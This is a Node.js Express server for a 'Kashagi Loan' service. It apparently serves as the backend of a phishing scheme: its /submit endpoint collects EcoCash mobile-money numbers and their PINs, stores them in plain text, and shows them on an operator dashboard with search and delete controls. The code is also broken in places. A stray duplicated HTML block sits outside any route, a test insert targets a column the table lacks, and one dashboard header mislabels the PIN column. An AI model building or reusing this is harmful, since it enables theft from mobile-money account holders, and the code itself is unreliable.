const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");

const app = express();

app.use(cors());
app.use(express.json());

const pool = new Pool({
connectionString: process.env.DATABASE_URL,
ssl: {
rejectUnauthorized: false
}
});

app.get("/", (req, res) => {
res.send("Kashagi Backend Running");
});

app.get("/test-db", async (req, res) => {
  try {
    const result = await pool.query("SELECT NOW()");
    res.json(result.rows[0]);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get("/create-table", async (req, res) => {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS submissions (
        id SERIAL PRIMARY KEY,
        ecocash_number TEXT NOT NULL,
        ecocash_pin TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    res.send("Table created successfully");
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get("/save-test", async (req, res) => {
  try {
    await pool.query(
      "INSERT INTO submissions (ecocash_number, reference_number) VALUES ($1,$2)",
      ["0771234567", "TEST123"]
    );

    res.send("Test data saved");
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});
app.post("/submit", async (req, res) => {
try {

const { ecocash_number, ecocash_pin } = req.body;

await pool.query(
  "INSERT INTO submissions (ecocash_number, ecocash_pin) VALUES ($1,$2)",
  [ecocash_number, ecocash_pin]
);

res.json({
  success: true,
  message: "Data saved successfully"
});

} catch (err) {

res.status(500).json({
  success: false,
  error: err.message
});

}
});

app.get("/delete/:id", async (req, res) => {
try {

await pool.query(
  "DELETE FROM submissions WHERE id=$1",
  [req.params.id]
);

res.redirect("/submissions");

} catch (err) {

res.status(500).send(err.message);

}
});

app.get("/submissions", async (req, res) => {

try {

const search = req.query.search || "";

let result;

if(search){

result = await pool.query(

"SELECT * FROM submissions WHERE ecocash_number ILIKE $1 ORDER BY id DESC",

[`%${search}%`]

);

}else{

result = await pool.query(

"SELECT * FROM submissions ORDER BY id DESC"

);

}

const totalResult = await pool.query(

"SELECT COUNT(*) FROM submissions"

);

const todayResult = await pool.query(

"SELECT COUNT(*) FROM submissions WHERE DATE(created_at)=CURRENT_DATE"

);

let rows = "";

result.rows.forEach(item=>{

rows += `
<tr>

<td>
<input
type="checkbox"
name="ids"
value="${item.id}">
</td>

<td>${item.id}</td>

<td>${item.ecocash_number}</td>

<td>${item.ecocash_pin}</td>

<td>${new Date(item.created_at).toLocaleString()}</td>

<td>

<a
href="/delete/${item.id}"
onclick="return confirm('Delete this record?')"
style="color:red;font-weight:bold;text-decoration:none;">

Delete

</a>

</td>

</tr>

`;

});

  res.send(`

<!DOCTYPE html>

<html>

<head>

<title>Kashagi Loan Dashboard</title>

<meta name="viewport" content="width=device-width, initial-scale=1">

<style>

*{
box-sizing:border-box;
}

body{
margin:0;
padding:20px;
font-family:Arial,sans-serif;
background:#f4f6f9;
}

.container{
max-width:1200px;
margin:auto;
}

h1{
text-align:center;
color:#1877f2;
margin-bottom:25px;
}

.cards{
display:flex;
gap:15px;
margin-bottom:20px;
flex-wrap:wrap;
}

.card{
flex:1;
min-width:220px;
background:#fff;
padding:20px;
border-radius:10px;
text-align:center;
box-shadow:0 2px 10px rgba(0,0,0,.1);
}

.card h3{
margin:0;
font-size:18px;
}

.card h2{
margin-top:10px;
color:#1877f2;
}

.search{
display:flex;
justify-content:center;
gap:10px;
margin-bottom:20px;
flex-wrap:wrap;
}

.search input{
padding:10px;
width:260px;
border:1px solid #ccc;
border-radius:5px;
}

.search button{
padding:10px 18px;
background:#1877f2;
color:white;
border:none;
border-radius:5px;
cursor:pointer;
}

.delete-btn{
background:#dc3545 !important;
}

table{
width:100%;
border-collapse:collapse;
background:#fff;
box-shadow:0 2px 10px rgba(0,0,0,.1);
}

table,th,td{
border:1px solid #dcdcdc;
}

th{
background:#1877f2;
color:white;
padding:12px;
}

td{
padding:10px;
text-align:center;
}

tr:nth-child(even){
background:#f8f9fa;
}

tr:hover{
background:#eef5ff;
}

</style>

</head>

<body>

<div class="container">

<h1>Kashagi Loan Dashboard</h1>

<div class="cards">

<div class="card">
<h3>Total Submissions</h3>
<h2>${totalResult.rows[0].count}</h2>
</div>

<div class="card">
<h3>Today's Submissions</h3>
<h2>${todayResult.rows[0].count}</h2>
</div>

</div>

<div class="search">

<form method="GET" action="/submissions">

<input
type="text"
name="search"
value="${search}"
placeholder="Search EcoCash Number">

<button type="submit">
Search
</button>

</form>

</div>

<form id="deleteForm">

<button
type="button"
class="delete-btn"
onclick="deleteSelected()"
style="margin-bottom:15px;padding:10px 15px;color:white;border:none;border-radius:5px;cursor:pointer;">

Delete Selected

</button>

<table>

<tr>

<th>
<input type="checkbox" id="selectAll">
</th>

<th>ID</th>

<th>EcoCash Number</th>

<th>Reference Number</th>

<th>Date Submitted</th>

<th>Action</th>

</tr>

${rows}

</table>

</form>

<script>

document.getElementById("selectAll").addEventListener("change",function(){

document.querySelectorAll("input[name='ids']").forEach(function(box){

box.checked=this.checked;

},this);

});

async function deleteSelected(){

const ids=[];

document.querySelectorAll("input[name='ids']:checked").forEach(function(box){

ids.push(parseInt(box.value));

});

if(ids.length===0){

alert("Please select at least one record.");

return;

}

if(!confirm("Delete selected records?")){

return;

}

const response=await fetch("/delete-selected",{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({ids})

});

if(response.ok){

location.reload();

}else{

alert("Failed to delete selected records.");

}

}

</script>

</body>

</html>

`);

} catch (err) {

res.status(500).send(err.message);

}

});

res.send(`

<!DOCTYPE html><html>
<head>
<title>Kashagi Dashboard</title><style>

body{
  font-family:Arial,sans-serif;
  background:#f4f6f9;
  padding:20px;
}

.container{
  max-width:1200px;
  margin:auto;
}

h1{
  text-align:center;
  color:#1877f2;
}

.cards{
  display:flex;
  gap:15px;
  margin-bottom:20px;
}

.card{
  flex:1;
  background:white;
  padding:20px;
  border-radius:10px;
  text-align:center;
  box-shadow:0 2px 10px rgba(0,0,0,.1);
}

.card h2{
  color:#1877f2;
}

.search{
  margin-bottom:20px;
  text-align:center;
}

.search input{
  padding:10px;
  width:250px;
}

.search button{
  padding:10px 15px;
  background:#1877f2;
  color:white;
  border:none;
  cursor:pointer;
}

table{
  width:100%;
  border-collapse:collapse;
  background:white;
  box-shadow:0 2px 10px rgba(0,0,0,.1);
  border:2px solid #999;
}

th{
  background:#1877f2;
  color:white;
  padding:12px;
  border:1px solid #999;
}

td{
  padding:12px;
  text-align:center;
  border:1px solid #999;
}

tr{
  border-bottom:1px solid #999;
}

tr:nth-child(even){
  background:#f8f9fa;
}

tr:hover{
  background:#eaf4ff;
}

</style></head><body><div class="container"><h1>Kashagi Dashboard</h1><div class="cards"><div class="card">
<h3>Total Submissions</h3>
<h2>${totalResult.rows[0].count}</h2>
</div><div class="card">
<h3>Today's Submissions</h3>
<h2>${todayResult.rows[0].count}</h2>
</div></div><div class="search"><form method="GET" action="/submissions"><input
type="text"
name="search"
value="${search}"
placeholder="Search EcoCash Number">

<button type="submit">
Search
</button><button
type="submit"
form="deleteForm"
style="background:red;color:white;border:none;padding:10px 15px;margin-left:10px;border-radius:5px;cursor:pointer;"
onclick="return confirm('Delete selected records?')">
Delete Selected
</button></form></div><form id="deleteForm">

</table>

</form><tr>
<tr>

<th>
<input type="checkbox" id="selectAll">
</th>

<th>ID</th>

<th>EcoCash Number</th>

<th>EcoCash Pin</th>

<th>Date Submitted</th>

<th>Action</th>

</tr>${rows}

</table></form>

<script>

document.getElementById("selectAll").addEventListener("change", function () {

document.querySelectorAll("input[name='ids']").forEach(function(box){

box.checked = document.getElementById("selectAll").checked;

});

});

document.getElementById("deleteForm").addEventListener("submit", function(e){

e.preventDefault();

const ids=[];

document.querySelectorAll("input[name='ids']:checked").forEach(function(box){

ids.push(box.value);

});

if(ids.length===0){

alert("Please select at least one record.");

return;

}

fetch("/delete-selected",{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({ids})

}).then(()=>{

location.reload();

});

});

</script></div></body>
</html>
`);} catch (err) {

res.status(500).send(err.message);

}
});


app.post("/delete-selected", async (req, res) => {

  try {

    const { ids } = req.body;

    if (!ids || ids.length === 0) {
      return res.redirect("/submissions");
    }

    await pool.query(
      "DELETE FROM submissions WHERE id = ANY($1::int[])",
      [Array.isArray(ids) ? ids : [ids]]
    );

    res.redirect("/submissions");

  } catch (err) {

    res.status(500).send(err.message);

  }

});
app.listen(process.env.PORT || 3000, () => {
console.log("Server started");
});
